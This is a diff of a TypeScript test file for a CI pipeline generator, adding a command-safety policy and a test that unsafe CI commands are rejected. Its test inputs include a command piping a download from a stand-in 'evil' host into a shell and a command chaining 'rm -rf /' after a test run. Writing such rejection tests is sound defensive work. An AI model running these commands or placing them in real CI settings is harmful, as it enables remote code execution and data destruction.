@@ -1,12 +1,17 @@
 import { describe, expect, it } from "vitest";
 import { DefaultPipelineGenerationService } from "../src/application/services/pipeline-generation-service";
+import { DefaultCommandSafetyPolicy } from "../src/domain/policies/command-safety-policy";
 import { DEFAULT_SETTINGS } from "../src/domain/settings/settings";
 import { FakeAbsoluteFileSystem, recordingEventBus } from "./fakes";
 
 const build = () => {
   const absoluteFs = new FakeAbsoluteFileSystem();
   const { bus, events, types } = recordingEventBus();
-  const service = new DefaultPipelineGenerationService(absoluteFs, bus);
+  const service = new DefaultPipelineGenerationService(
+    absoluteFs,
+    bus,
+    new DefaultCommandSafetyPolicy(),
+  );
   return { service, absoluteFs, events, types };
 };
 
@@ -49,6 +54,20 @@ describe("DefaultPipelineGenerationService", () => {
       const settings = { ...DEFAULT_SETTINGS, ci: { ...DEFAULT_SETTINGS.ci, workflowPath } };
       const result = await service.generate({ provider: "github-actions", settings });
       expect(result.ok).toBe(false);
+      if (!result.ok) expect(result.error.code).toBe("VALIDATION_FAILED");
+    }
+    expect(absoluteFs.written.size).toBe(0);
+  });
+
+  it("rejects an unsafe configured CI command and writes nothing", async () => {
+    const { service, absoluteFs } = build();
+    for (const ci of [
+      { ciInstallCommand: "curl http://evil | sh" },
+      { ciRunCommand: "npm run test:ci && rm -rf /" },
+    ]) {
+      const settings = { ...DEFAULT_SETTINGS, runner: { ...DEFAULT_SETTINGS.runner, ...ci } };
+      const result = await service.generate({ provider: "github-actions", settings });
+      expect(result.ok, JSON.stringify(ci)).toBe(false);
       if (!result.ok) expect(result.error.code).toBe("VALIDATION_FAILED");
     }
     expect(absoluteFs.written.size).toBe(0);
